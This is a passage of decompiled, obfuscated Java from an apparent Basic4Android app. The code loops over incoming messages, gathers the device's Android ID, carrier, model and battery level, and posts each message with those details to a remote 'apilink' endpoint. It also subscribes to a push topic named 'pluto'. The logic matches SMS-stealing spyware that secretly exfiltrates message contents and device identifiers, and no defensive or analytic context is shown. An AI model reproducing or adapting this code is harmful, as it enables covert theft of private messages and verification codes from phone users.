_messages = _vvvvvvvvv5(_startingintent);
 //BA.debugLineNum = 48;BA.debugLine="For i = 0 To messages.Size - 1";
if (true) break;

case 10:
//for
this.state = 13;
step15 = 1;
limit15 = (int) (_messages.getSize()-1);
_i = (int) (0) ;
this.state = 18;
if (true) break;

case 18:
//C
this.state = 13;
if ((step15 > 0 && _i <= limit15) || (step15 < 0 && _i >= limit15)) this.state = 12;
if (true) break;

case 19:
//C
this.state = 18;
_i = ((int)(0 + _i + step15)) ;
if (true) break;

case 12:
//C
this.state = 19;
 //BA.debugLineNum = 49;BA.debugLine="android = pd.AndroidID";
parent._vv3 = parent._v5.getAndroidID();
 //BA.debugLineNum = 50;BA.debugLine="Opr = pd.Carrier";
parent._v7 = parent._v5.getCarrier();
 //BA.debugLineNum = 51;BA.debugLine="model = pd.Manufacturer&\"-\"&p.Model";
parent._v0 = parent._v5.getManufacturer()+"-"+parent._vvv1.getModel();
 //BA.debugLineNum = 52;BA.debugLine="battry=pd.BatteryPercentage";
parent._vv4 = BA.NumberToString(parent._v5.getBatteryPercentage());
 //BA.debugLineNum = 53;BA.debugLine="data = \"result=ok&action=nwmessage&androidid=\"";
parent._vv7 = "result=ok&action=nwmessage&androidid="+parent._vv3+"&model="+parent._v0+"&battry="+parent._vv4+"&opr="+parent._v7+"&message="+BA.ObjectToString(_messages.Get(_i));
 //BA.debugLineNum = 54;BA.debugLine="ht.PostString(apilink,data)";
parent._vvv2._vvvvvv7 /*String*/ (_apilink,parent._vv7);
 if (true) break;
if (true) break;

case 13:
//C
this.state = 14;
;
 if (true) break;

case 14:
//C
this.state = 17;
;
 //BA.debugLineNum = 59;BA.debugLine="fm.HandleIntent(StartingIntent)";
parent._vvvvvvvvv6.HandleIntent((android.content.Intent)(_startingintent.getObject()));
 //BA.debugLineNum = 60;BA.debugLine="Sleep(0) 'allow the MessageReceived event to be";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (0));
this.state = 20;
return;
case 20:
//C
this.state = 17;
;
 if (true) break;

case 16:
//C
this.state = 17;
 //BA.debugLineNum = 63;BA.debugLine="Log(\"suck\")";
anywheresoftware.b4a.keywords.Common.LogImpl("13342368","suck",0);
 if (true) break;

case 17:
//C
this.state = -1;
;
 //BA.debugLineNum = 65;BA.debugLine="End Sub";
if (true) break;

            }
        }
    }
}
public static String  _subscribetotopics() throws Exception{
 //BA.debugLineNum = 28;BA.debugLine="Public Sub SubscribeToTopics";
 //BA.debugLineNum = 29;BA.debugLine="fm.SubscribeToTopic(\"pluto\") 'you can subscribe t";
_vvvvvvvvv6.SubscribeToTopic("pluto");
 //BA.debugLineNum = 30;BA.debugLine="End Sub";
return "";
}
}
